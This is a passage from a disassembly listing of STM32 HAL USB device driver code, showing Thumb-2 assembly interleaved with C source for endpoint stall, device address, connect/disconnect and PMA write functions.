 8007f9a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f9e:	681b      	ldr	r3, [r3, #0]
 8007fa0:	785b      	ldrb	r3, [r3, #1]
 8007fa2:	2b00      	cmp	r3, #0
 8007fa4:	f040 8085 	bne.w	80080b2 <USB_EPStartXfer+0x1688>
 8007fa8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fac:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007fb0:	681b      	ldr	r3, [r3, #0]
 8007fb2:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007fb6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fba:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007fbe:	681b      	ldr	r3, [r3, #0]
 8007fc0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007fc4:	b29b      	uxth	r3, r3
 8007fc6:	461a      	mov	r2, r3
 8007fc8:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007fcc:	4413      	add	r3, r2
 8007fce:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007fd2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fd6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fda:	681b      	ldr	r3, [r3, #0]
 8007fdc:	781b      	ldrb	r3, [r3, #0]
 8007fde:	00da      	lsls	r2, r3, #3
 8007fe0:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007fe4:	4413      	add	r3, r2
 8007fe6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007fea:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 8007fee:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007ff2:	881b      	ldrh	r3, [r3, #0]
 8007ff4:	b29b      	uxth	r3, r3
 8007ff6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007ffa:	b29a      	uxth	r2, r3
 8007ffc:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008000:	801a      	strh	r2, [r3, #0]
 8008002:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008006:	2b3e      	cmp	r3, #62	; 0x3e
 8008008:	d923      	bls.n	8008052 <USB_EPStartXfer+0x1628>
 800800a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800800e:	095b      	lsrs	r3, r3, #5
 8008010:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008014:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008018:	f003 031f 	and.w	r3, r3, #31
 800801c:	2b00      	cmp	r3, #0
 800801e:	d104      	bne.n	800802a <USB_EPStartXfer+0x1600>
 8008020:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008024:	3b01      	subs	r3, #1
 8008026:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 800802a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800802e:	881b      	ldrh	r3, [r3, #0]
 8008030:	b29a      	uxth	r2, r3
 8008032:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008036:	b29b      	uxth	r3, r3
 8008038:	029b      	lsls	r3, r3, #10
 800803a:	b29b      	uxth	r3, r3
 800803c:	4313      	orrs	r3, r2
 800803e:	b29b      	uxth	r3, r3
 8008040:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008044:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008048:	b29a      	uxth	r2, r3
 800804a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800804e:	801a      	strh	r2, [r3, #0]
 8008050:	e05c      	b.n	800810c <USB_EPStartXfer+0x16e2>
 8008052:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008056:	2b00      	cmp	r3, #0
 8008058:	d10c      	bne.n	8008074 <USB_EPStartXfer+0x164a>
 800805a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800805e:	881b      	ldrh	r3, [r3, #0]
 8008060:	b29b      	uxth	r3, r3
 8008062:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008066:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800806a:	b29a      	uxth	r2, r3
 800806c:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008070:	801a      	strh	r2, [r3, #0]
 8008072:	e04b      	b.n	800810c <USB_EPStartXfer+0x16e2>
 8008074:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008078:	085b      	lsrs	r3, r3, #1
 800807a:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 800807e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008082:	f003 0301 	and.w	r3, r3, #1
 8008086:	2b00      	cmp	r3, #0
 8008088:	d004      	beq.n	8008094 <USB_EPStartXfer+0x166a>
 800808a:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 800808e:	3301      	adds	r3, #1
 8008090:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008094:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008098:	881b      	ldrh	r3, [r3, #0]
 800809a:	b29a      	uxth	r2, r3
 800809c:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80080a0:	b29b      	uxth	r3, r3
 80080a2:	029b      	lsls	r3, r3, #10
 80080a4:	b29b      	uxth	r3, r3
 80080a6:	4313      	orrs	r3, r2
 80080a8:	b29a      	uxth	r2, r3
 80080aa:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080ae:	801a      	strh	r2, [r3, #0]
 80080b0:	e02c      	b.n	800810c <USB_EPStartXfer+0x16e2>
 80080b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080ba:	681b      	ldr	r3, [r3, #0]
 80080bc:	785b      	ldrb	r3, [r3, #1]
 80080be:	2b01      	cmp	r3, #1
 80080c0:	d124      	bne.n	800810c <USB_EPStartXfer+0x16e2>
 80080c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080c6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80080ca:	681b      	ldr	r3, [r3, #0]
 80080cc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80080d0:	b29b      	uxth	r3, r3
 80080d2:	461a      	mov	r2, r3
 80080d4:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80080d8:	4413      	add	r3, r2
 80080da:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 80080de:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080e2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080e6:	681b      	ldr	r3, [r3, #0]
 80080e8:	781b      	ldrb	r3, [r3, #0]
 80080ea:	00da      	lsls	r2, r3, #3
 80080ec:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80080f0:	4413      	add	r3, r2
 80080f2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80080f6:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 80080fa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080fe:	b29a      	uxth	r2, r3
 8008100:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 8008104:	801a      	strh	r2, [r3, #0]
 8008106:	e001      	b.n	800810c <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 8008108:	2301      	movs	r3, #1
 800810a:	e03a      	b.n	8008182 <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800810c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008110:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008114:	681a      	ldr	r2, [r3, #0]
 8008116:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800811a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800811e:	681b      	ldr	r3, [r3, #0]
 8008120:	781b      	ldrb	r3, [r3, #0]
 8008122:	009b      	lsls	r3, r3, #2
 8008124:	4413      	add	r3, r2
 8008126:	881b      	ldrh	r3, [r3, #0]
 8008128:	b29b      	uxth	r3, r3
 800812a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800812e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008132:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008136:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800813a:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800813e:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008142:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008146:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800814a:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800814e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008152:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008156:	681a      	ldr	r2, [r3, #0]
 8008158:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800815c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008160:	681b      	ldr	r3, [r3, #0]
 8008162:	781b      	ldrb	r3, [r3, #0]
 8008164:	009b      	lsls	r3, r3, #2
 8008166:	441a      	add	r2, r3
 8008168:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800816c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008170:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008174:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008178:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800817c:	b29b      	uxth	r3, r3
 800817e:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008180:	2300      	movs	r3, #0
}
 8008182:	4618      	mov	r0, r3
 8008184:	f507 7784 	add.w	r7, r7, #264	; 0x108
 8008188:	46bd      	mov	sp, r7
 800818a:	bd80      	pop	{r7, pc}

0800818c <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800818c:	b480      	push	{r7}
 800818e:	b085      	sub	sp, #20
 8008190:	af00      	add	r7, sp, #0
 8008192:	6078      	str	r0, [r7, #4]
 8008194:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 8008196:	683b      	ldr	r3, [r7, #0]
 8008198:	785b      	ldrb	r3, [r3, #1]
 800819a:	2b00      	cmp	r3, #0
 800819c:	d020      	beq.n	80081e0 <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 800819e:	687a      	ldr	r2, [r7, #4]
 80081a0:	683b      	ldr	r3, [r7, #0]
 80081a2:	781b      	ldrb	r3, [r3, #0]
 80081a4:	009b      	lsls	r3, r3, #2
 80081a6:	4413      	add	r3, r2
 80081a8:	881b      	ldrh	r3, [r3, #0]
 80081aa:	b29b      	uxth	r3, r3
 80081ac:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80081b0:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80081b4:	81bb      	strh	r3, [r7, #12]
 80081b6:	89bb      	ldrh	r3, [r7, #12]
 80081b8:	f083 0310 	eor.w	r3, r3, #16
 80081bc:	81bb      	strh	r3, [r7, #12]
 80081be:	687a      	ldr	r2, [r7, #4]
 80081c0:	683b      	ldr	r3, [r7, #0]
 80081c2:	781b      	ldrb	r3, [r3, #0]
 80081c4:	009b      	lsls	r3, r3, #2
 80081c6:	441a      	add	r2, r3
 80081c8:	89bb      	ldrh	r3, [r7, #12]
 80081ca:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80081ce:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80081d2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80081d6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80081da:	b29b      	uxth	r3, r3
 80081dc:	8013      	strh	r3, [r2, #0]
 80081de:	e01f      	b.n	8008220 <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 80081e0:	687a      	ldr	r2, [r7, #4]
 80081e2:	683b      	ldr	r3, [r7, #0]
 80081e4:	781b      	ldrb	r3, [r3, #0]
 80081e6:	009b      	lsls	r3, r3, #2
 80081e8:	4413      	add	r3, r2
 80081ea:	881b      	ldrh	r3, [r3, #0]
 80081ec:	b29b      	uxth	r3, r3
 80081ee:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80081f2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80081f6:	81fb      	strh	r3, [r7, #14]
 80081f8:	89fb      	ldrh	r3, [r7, #14]
 80081fa:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80081fe:	81fb      	strh	r3, [r7, #14]
 8008200:	687a      	ldr	r2, [r7, #4]
 8008202:	683b      	ldr	r3, [r7, #0]
 8008204:	781b      	ldrb	r3, [r3, #0]
 8008206:	009b      	lsls	r3, r3, #2
 8008208:	441a      	add	r2, r3
 800820a:	89fb      	ldrh	r3, [r7, #14]
 800820c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008210:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008214:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008218:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800821c:	b29b      	uxth	r3, r3
 800821e:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008220:	2300      	movs	r3, #0
}
 8008222:	4618      	mov	r0, r3
 8008224:	3714      	adds	r7, #20
 8008226:	46bd      	mov	sp, r7
 8008228:	f85d 7b04 	ldr.w	r7, [sp], #4
 800822c:	4770      	bx	lr

0800822e <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800822e:	b480      	push	{r7}
 8008230:	b087      	sub	sp, #28
 8008232:	af00      	add	r7, sp, #0
 8008234:	6078      	str	r0, [r7, #4]
 8008236:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8008238:	683b      	ldr	r3, [r7, #0]
 800823a:	7b1b      	ldrb	r3, [r3, #12]
 800823c:	2b00      	cmp	r3, #0
 800823e:	f040 809d 	bne.w	800837c <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 8008242:	683b      	ldr	r3, [r7, #0]
 8008244:	785b      	ldrb	r3, [r3, #1]
 8008246:	2b00      	cmp	r3, #0
 8008248:	d04c      	beq.n	80082e4 <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800824a:	687a      	ldr	r2, [r7, #4]
 800824c:	683b      	ldr	r3, [r7, #0]
 800824e:	781b      	ldrb	r3, [r3, #0]
 8008250:	009b      	lsls	r3, r3, #2
 8008252:	4413      	add	r3, r2
 8008254:	881b      	ldrh	r3, [r3, #0]
 8008256:	823b      	strh	r3, [r7, #16]
 8008258:	8a3b      	ldrh	r3, [r7, #16]
 800825a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800825e:	2b00      	cmp	r3, #0
 8008260:	d01b      	beq.n	800829a <USB_EPClearStall+0x6c>
 8008262:	687a      	ldr	r2, [r7, #4]
 8008264:	683b      	ldr	r3, [r7, #0]
 8008266:	781b      	ldrb	r3, [r3, #0]
 8008268:	009b      	lsls	r3, r3, #2
 800826a:	4413      	add	r3, r2
 800826c:	881b      	ldrh	r3, [r3, #0]
 800826e:	b29b      	uxth	r3, r3
 8008270:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008274:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008278:	81fb      	strh	r3, [r7, #14]
 800827a:	687a      	ldr	r2, [r7, #4]
 800827c:	683b      	ldr	r3, [r7, #0]
 800827e:	781b      	ldrb	r3, [r3, #0]
 8008280:	009b      	lsls	r3, r3, #2
 8008282:	441a      	add	r2, r3
 8008284:	89fb      	ldrh	r3, [r7, #14]
 8008286:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800828a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800828e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008292:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8008296:	b29b      	uxth	r3, r3
 8008298:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 800829a:	683b      	ldr	r3, [r7, #0]
 800829c:	78db      	ldrb	r3, [r3, #3]
 800829e:	2b01      	cmp	r3, #1
 80082a0:	d06c      	beq.n	800837c <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80082a2:	687a      	ldr	r2, [r7, #4]
 80082a4:	683b      	ldr	r3, [r7, #0]
 80082a6:	781b      	ldrb	r3, [r3, #0]
 80082a8:	009b      	lsls	r3, r3, #2
 80082aa:	4413      	add	r3, r2
 80082ac:	881b      	ldrh	r3, [r3, #0]
 80082ae:	b29b      	uxth	r3, r3
 80082b0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80082b4:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80082b8:	81bb      	strh	r3, [r7, #12]
 80082ba:	89bb      	ldrh	r3, [r7, #12]
 80082bc:	f083 0320 	eor.w	r3, r3, #32
 80082c0:	81bb      	strh	r3, [r7, #12]
 80082c2:	687a      	ldr	r2, [r7, #4]
 80082c4:	683b      	ldr	r3, [r7, #0]
 80082c6:	781b      	ldrb	r3, [r3, #0]
 80082c8:	009b      	lsls	r3, r3, #2
 80082ca:	441a      	add	r2, r3
 80082cc:	89bb      	ldrh	r3, [r7, #12]
 80082ce:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80082d2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80082d6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80082da:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80082de:	b29b      	uxth	r3, r3
 80082e0:	8013      	strh	r3, [r2, #0]
 80082e2:	e04b      	b.n	800837c <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80082e4:	687a      	ldr	r2, [r7, #4]
 80082e6:	683b      	ldr	r3, [r7, #0]
 80082e8:	781b      	ldrb	r3, [r3, #0]
 80082ea:	009b      	lsls	r3, r3, #2
 80082ec:	4413      	add	r3, r2
 80082ee:	881b      	ldrh	r3, [r3, #0]
 80082f0:	82fb      	strh	r3, [r7, #22]
 80082f2:	8afb      	ldrh	r3, [r7, #22]
 80082f4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80082f8:	2b00      	cmp	r3, #0
 80082fa:	d01b      	beq.n	8008334 <USB_EPClearStall+0x106>
 80082fc:	687a      	ldr	r2, [r7, #4]
 80082fe:	683b      	ldr	r3, [r7, #0]
 8008300:	781b      	ldrb	r3, [r3, #0]
 8008302:	009b      	lsls	r3, r3, #2
 8008304:	4413      	add	r3, r2
 8008306:	881b      	ldrh	r3, [r3, #0]
 8008308:	b29b      	uxth	r3, r3
 800830a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800830e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008312:	82bb      	strh	r3, [r7, #20]
 8008314:	687a      	ldr	r2, [r7, #4]
 8008316:	683b      	ldr	r3, [r7, #0]
 8008318:	781b      	ldrb	r3, [r3, #0]
 800831a:	009b      	lsls	r3, r3, #2
 800831c:	441a      	add	r2, r3
 800831e:	8abb      	ldrh	r3, [r7, #20]
 8008320:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008324:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008328:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800832c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008330:	b29b      	uxth	r3, r3
 8008332:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008334:	687a      	ldr	r2, [r7, #4]
 8008336:	683b      	ldr	r3, [r7, #0]
 8008338:	781b      	ldrb	r3, [r3, #0]
 800833a:	009b      	lsls	r3, r3, #2
 800833c:	4413      	add	r3, r2
 800833e:	881b      	ldrh	r3, [r3, #0]
 8008340:	b29b      	uxth	r3, r3
 8008342:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008346:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800834a:	827b      	strh	r3, [r7, #18]
 800834c:	8a7b      	ldrh	r3, [r7, #18]
 800834e:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8008352:	827b      	strh	r3, [r7, #18]
 8008354:	8a7b      	ldrh	r3, [r7, #18]
 8008356:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800835a:	827b      	strh	r3, [r7, #18]
 800835c:	687a      	ldr	r2, [r7, #4]
 800835e:	683b      	ldr	r3, [r7, #0]
 8008360:	781b      	ldrb	r3, [r3, #0]
 8008362:	009b      	lsls	r3, r3, #2
 8008364:	441a      	add	r2, r3
 8008366:	8a7b      	ldrh	r3, [r7, #18]
 8008368:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800836c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008370:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008374:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008378:	b29b      	uxth	r3, r3
 800837a:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 800837c:	2300      	movs	r3, #0
}
 800837e:	4618      	mov	r0, r3
 8008380:	371c      	adds	r7, #28
 8008382:	46bd      	mov	sp, r7
 8008384:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008388:	4770      	bx	lr

0800838a <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 800838a:	b480      	push	{r7}
 800838c:	b083      	sub	sp, #12
 800838e:	af00      	add	r7, sp, #0
 8008390:	6078      	str	r0, [r7, #4]
 8008392:	460b      	mov	r3, r1
 8008394:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 8008396:	78fb      	ldrb	r3, [r7, #3]
 8008398:	2b00      	cmp	r3, #0
 800839a:	d103      	bne.n	80083a4 <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 800839c:	687b      	ldr	r3, [r7, #4]
 800839e:	2280      	movs	r2, #128	; 0x80
 80083a0:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 80083a4:	2300      	movs	r3, #0
}
 80083a6:	4618      	mov	r0, r3
 80083a8:	370c      	adds	r7, #12
 80083aa:	46bd      	mov	sp, r7
 80083ac:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083b0:	4770      	bx	lr

080083b2 <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 80083b2:	b480      	push	{r7}
 80083b4:	b083      	sub	sp, #12
 80083b6:	af00      	add	r7, sp, #0
 80083b8:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 80083ba:	687b      	ldr	r3, [r7, #4]
 80083bc:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 80083c0:	b29b      	uxth	r3, r3
 80083c2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80083c6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80083ca:	b29a      	uxth	r2, r3
 80083cc:	687b      	ldr	r3, [r7, #4]
 80083ce:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80083d2:	2300      	movs	r3, #0
}
 80083d4:	4618      	mov	r0, r3
 80083d6:	370c      	adds	r7, #12
 80083d8:	46bd      	mov	sp, r7
 80083da:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083de:	4770      	bx	lr

080083e0 <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 80083e0:	b480      	push	{r7}
 80083e2:	b083      	sub	sp, #12
 80083e4:	af00      	add	r7, sp, #0
 80083e6:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 80083e8:	687b      	ldr	r3, [r7, #4]
 80083ea:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 80083ee:	b29b      	uxth	r3, r3
 80083f0:	f3c3 030e 	ubfx	r3, r3, #0, #15
 80083f4:	b29a      	uxth	r2, r3
 80083f6:	687b      	ldr	r3, [r7, #4]
 80083f8:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80083fc:	2300      	movs	r3, #0
}
 80083fe:	4618      	mov	r0, r3
 8008400:	370c      	adds	r7, #12
 8008402:	46bd      	mov	sp, r7
 8008404:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008408:	4770      	bx	lr

0800840a <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 800840a:	b480      	push	{r7}
 800840c:	b085      	sub	sp, #20
 800840e:	af00      	add	r7, sp, #0
 8008410:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 8008412:	687b      	ldr	r3, [r7, #4]
 8008414:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8008418:	b29b      	uxth	r3, r3
 800841a:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 800841c:	68fb      	ldr	r3, [r7, #12]
}
 800841e:	4618      	mov	r0, r3
 8008420:	3714      	adds	r7, #20
 8008422:	46bd      	mov	sp, r7
 8008424:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008428:	4770      	bx	lr

0800842a <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 800842a:	b480      	push	{r7}
 800842c:	b083      	sub	sp, #12
 800842e:	af00      	add	r7, sp, #0
 8008430:	6078      	str	r0, [r7, #4]
 8008432:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8008434:	2300      	movs	r3, #0
}
 8008436:	4618      	mov	r0, r3
 8008438:	370c      	adds	r7, #12
 800843a:	46bd      	mov	sp, r7
 800843c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008440:	4770      	bx	lr

08008442 <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 8008442:	b480      	push	{r7}
 8008444:	b08b      	sub	sp, #44	; 0x2c
 8008446:	af00      	add	r7, sp, #0
 8008448:	60f8      	str	r0, [r7, #12]
 800844a:	60b9      	str	r1, [r7, #8]
 800844c:	4611      	mov	r1, r2
 800844e:	461a      	mov	r2, r3
 8008450:	460b      	mov	r3, r1
 8008452:	80fb      	strh	r3, [r7, #6]
 8008454:	4613      	mov	r3, r2
 8008456:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 8008458:	88bb      	ldrh	r3, [r7, #4]
 800845a:	3301      	adds	r3, #1
 800845c:	085b      	lsrs	r3, r3, #1
 800845e:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 8008460:	68fb      	ldr	r3, [r7, #12]
 8008462:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008464:	68bb      	ldr	r3, [r7, #8]
 8008466:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 8008468:	88fa      	ldrh	r2, [r7, #6]
